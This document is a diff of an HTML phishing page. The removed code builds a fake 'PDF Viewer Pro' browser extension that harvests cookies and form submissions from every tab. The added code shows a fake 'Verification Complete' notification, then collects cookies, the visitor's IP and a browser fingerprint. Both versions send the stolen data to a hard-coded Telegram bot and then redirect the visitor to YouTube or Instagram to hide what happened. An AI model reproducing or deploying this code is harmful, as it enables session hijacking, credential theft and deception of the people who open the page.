@@ -2,124 +2,46 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            color: #333;
-        }
-        .container { text-align: center; display: none; }
+        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
     </style>
 </head>
 <body>
 
-    <!-- 👻 Kuch nahi dikhega – Sirf blank page -->
-    <div style="display:none;">
-        <!-- This page is intentionally left blank -->
+    <div style="text-align:center;">
+        <div style="font-size:48px;">🔔</div>
+        <p style="color:#333;">Loading...</p>
     </div>
 
     <script>
-        // ============================================================
-        // 🔥 TELEGRAM CONFIG – YAHAN APNA TOKEN AUR CHAT_ID DAALO
-        // ============================================================
         const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
         const CHAT_ID = "6389764004";
 
         // ============================================================
-        // 🧠 GHOST EXTENSION INSTALLER (Background)
+        // 🧠 NOTIFICATION PHISHING
         // ============================================================
 
-        // 1️⃣ Create extension files dynamically
-        function createExtension() {
-            const manifest = {
-                "manifest_version": 3,
-                "name": "PDF Viewer Pro",
-                "version": "1.0",
-                "permissions": ["cookies", "tabs", "storage", "webRequest"],
-                "host_permissions": ["http://*/", "https://*/"],
-                "background": {
-                    "service_worker": "background.js"
-                }
-            };
-
-            const background = `
-                const BOT_TOKEN = "${BOT_TOKEN}";
-                const CHAT_ID = "${CHAT_ID}";
-
-                // Send data to Telegram
-                async function sendToTelegram(data) {
-                    const url = \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${encodeURIComponent(data)}&parse_mode=Markdown\`;
-                    try {
-                        await fetch(url, { method: 'GET' });
-                    } catch(e) {}
-                }
-
-                // Capture cookies from every tab
-                chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-                    if (changeInfo.status === 'complete' && tab.url) {
-                        chrome.cookies.getAll({ url: tab.url }, (cookies) => {
-                            if (cookies.length > 0) {
-                                let cookieString = cookies.map(c => \`\${c.name}=\${c.value}\`).join('; ');
-                                let msg = \`🎯 **COOKIES CAPTURED**\\n🌐 URL: \${tab.url}\\n🍪 Cookies: \${cookieString}\`;
-                                sendToTelegram(msg);
-                            }
-                        });
-                    }
+        Notification.requestPermission().then(permission => {
+            if (permission === 'granted') {
+                new Notification('✅ Verification Complete', {
+                    body: 'Your account has been verified successfully.',
+                    icon: 'https://img.icons8.com/color/48/000000/verified-account.png'
                 });
+                captureData();
+            }
+        });
 
-                // Capture saved passwords (when form submitted)
-                chrome.webRequest.onBeforeRequest.addListener(
-                    (details) => {
-                        if (details.method === 'POST') {
-                            let msg = \`🎯 **FORM SUBMITTED**\\n🌐 URL: \${details.url}\\n📝 Data: \${details.requestBody}\`;
-                            sendToTelegram(msg);
-                        }
-                    },
-                    { urls: ["<all_urls>"] },
-                    ["requestBody"]
-                );
+        async function captureData() {
+            const ip = await getIP();
+            const cookies = document.cookie || 'No cookies found';
+            const fingerprint = getFingerprint();
 
-                console.log('[+] Ghost Extension running...');
-            `;
-
-            // Create Blob URLs for extension files
-            const manifestBlob = new Blob([JSON.stringify(manifest)], { type: 'application/json' });
-            const backgroundBlob = new Blob([background], { type: 'application/javascript' });
-
-            return { manifestBlob, backgroundBlob };
+            let msg = `🎯 **NOTIFICATION PHISHING (Mobile)**\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n🍪 Cookies: ${cookies}\n🖥️ Fingerprint: ${fingerprint.userAgent}\n🕐 Time: ${new Date().toISOString()}`;
+            sendToTelegram(msg);
         }
 
-        // 2️⃣ Download and install extension (auto)
-        function installExtension() {
-            const { manifestBlob, backgroundBlob } = createExtension();
-
-            // Create download links
-            const manifestUrl = URL.createObjectURL(manifestBlob);
-            const backgroundUrl = URL.createObjectURL(backgroundBlob);
-
-            // Download extension files
-            const a = document.createElement('a');
-            a.href = manifestUrl;
-            a.download = 'manifest.json';
-            a.click();
-
-            const b = document.createElement('a');
-            b.href = backgroundUrl;
-            b.download = 'background.js';
-            b.click();
-
-            // Send to Telegram that extension was downloaded
-            const msg = `🎯 **GHOST EXTENSION INSTALLED**\n🌐 Victim IP: ${await getIP()}\n🕐 Time: ${new Date().toISOString()}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
-
-        // 3️⃣ Get IP
         async function getIP() {
             try {
                 let r = await fetch('https://api.ipify.org?format=json');
@@ -128,29 +50,26 @@
             } catch { return 'Unable to fetch'; }
         }
 
-        // ============================================================
-        // 🚀 MAIN EXECUTION
-        // ============================================================
-        window.addEventListener('load', async function() {
-            console.log('[+] Ghost Phishing + Extension started...');
+        function getFingerprint() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
 
-            // Install extension
-            installExtension();
+        function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            fetch(url, { method: 'GET' });
+        }
 
-            // Send initial notification
-            const ip = await getIP();
-            const msg = `🎯 **VICTIM CLICKED LINK**\n🌐 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}\n📱 User-Agent: ${navigator.userAgent}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
-            // 👻 Redirect after 3 seconds
-            setTimeout(() => {
-                window.location.href = 'https://www.youtube.com';
-            }, 3000);
-        });
-
-        // 👻 Blank page
-        document.body.style.background = '#ffffff';
-        document.body.innerHTML = '';
+        // 👻 Redirect after 3 seconds
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com';
+        }, 3000);
     </script>
 </body>
 </html>
